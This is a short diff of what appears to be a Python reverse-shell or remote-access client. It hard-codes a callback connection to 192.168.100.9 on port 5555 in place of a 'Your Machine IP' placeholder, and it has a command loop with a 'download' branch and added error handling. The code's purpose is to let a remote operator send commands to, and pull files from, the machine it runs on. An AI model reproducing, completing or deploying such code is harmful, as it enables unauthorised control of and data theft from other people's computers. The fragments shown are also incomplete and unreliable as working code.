@@ -4,7 +4,7 @@ import os
 
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-socket.connect(('Your Machine IP', 5555))
+socket.connect(('192.168.100.9', 5555))
 
 while True:
 
@@ -24,6 +24,9 @@ while True:
 
             socket.send(f'{data[3:]} Not Detected.'.encode('ascii'))
 
+            continue
+
+        except OSError:
             continue
 
     elif data[0:8] == 'download':
